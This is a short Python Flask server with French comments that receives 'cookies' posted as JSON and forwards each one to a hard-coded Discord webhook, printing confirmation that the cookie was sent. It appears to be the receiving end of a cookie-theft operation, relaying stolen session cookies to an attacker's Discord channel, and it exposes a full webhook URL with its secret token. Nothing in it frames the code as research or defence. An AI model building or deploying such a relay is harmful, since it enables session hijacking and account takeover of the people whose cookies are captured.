from flask import Flask, request
import requests  # pour envoyer des requêtes HTTP

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1399751822515765360/yMPVxF07xUsKKtaeXDMnmO2mcjQm0DBYqhv8fN3Z7eR75ydo39qKyzDTrIQoFo3yGDXu"

@app.route("/", methods=["POST"])
def recevoir_cookie():
    data = request.get_json()
    if not data or 'content' not in data:
        return "Bad request", 400

    cookie_content = data['content']

    # Envoie le cookie au webhook Discord
    discord_data = {
        "content": cookie_content
    }
    response = requests.post(WEBHOOK_URL, json=discord_data)

    if response.status_code == 204:
        print("✅ Cookie envoyé au webhook Discord")
    else:
        print(f"⚠️ Erreur envoi webhook Discord: {response.status_code}, {response.text}")

    return "Cookie reçu et envoyé", 200

@app.route("/", methods=["GET"])
def accueil():
    return "✅ Serveur backend en ligne", 200